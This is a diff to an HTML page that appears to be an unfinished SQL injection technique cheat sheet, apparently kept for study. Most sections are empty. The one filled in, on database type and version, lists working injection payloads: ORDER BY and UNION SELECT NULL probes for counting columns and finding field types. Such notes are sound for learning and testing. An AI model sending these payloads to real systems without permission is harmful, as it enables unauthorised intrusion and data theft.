@@ -88,35 +88,57 @@
 <pre><div class="column" style="display: inline-block; text-align: left; background-color:gray;">
 <details>
 <summary>HIDDEN DATA TECHNIQUES</summary>
-<p>DESCRIPTION: </p>
+<p><b>DESCRIPTION: </b></p>
 </details>
 <details>
 <summary>LOGIN BYPASS TECHNIQUES</summary>
-<p>DESCRIPTION: </p>
+<p><b>DESCRIPTION: </b></p>
 </details>
 <details>
 <summary>DATABASE TYPE/VERSION TECHNIQUES</summary>
-<p>DESCRIPTION: </p>
+<p><b>DESCRIPTION: Techniques used to retrieve the database version. </b></p>
+
+<p><b>STEPS: </b>
+1. get column number
+<b>method1:</b>' ORDER BY 1--
+<b>method2:</b>' UNION SELECT NULL--
+2. get field type
+' UNION SELECT 'a',NULL,NULL,NULL--
+' UNION SELECT NULL,'a',NULL,NULL--
+NOTE: It is needed to be iterative so you can find the right field type. For that number of columns
+is needed. </p>	
+	
+<p><b>COMMON TESTS:</b>
+
+<b>ORACLE:</b>  
+
+<b>MYSQL:</b>
+
+<b>SQL:</b>
+
+<b>POSTGRESQL:</b> 
+	
+</p>
 </details>
 <details>
 <summary>LISTING DATABASE CONTENT TECHNIQUES</summary>
-<p>DESCRIPTION: </p>
+<p><b>DESCRIPTION: </b></p>
 </details>
 <details>
 <summary>UNION ATTACKS TECHNIQUES</summary>
-<p>DESCRIPTION: </p>
+<p><b>DESCRIPTION: </b></p>
 </details>
 <details>
 <summary>BLIND ATTACKS TECHNIQUES</summary>
-<p>DESCRIPTION: </p>
+<p><b>DESCRIPTION: </b></p>
 </details>
 <details>
 <summary>ERROR-BASED TECHNIQUES</summary>
-<p>DESCRIPTION: </p>
+<p><b>DESCRIPTION: </b></p>
 </details>
 <details>
 <summary>ENCODING ATTACK TECHNIQUES</summary>
-<p>DESCRIPTION: </p>
+<p><b>DESCRIPTION: </b></p>
 </details>
 </div>
 </pre>
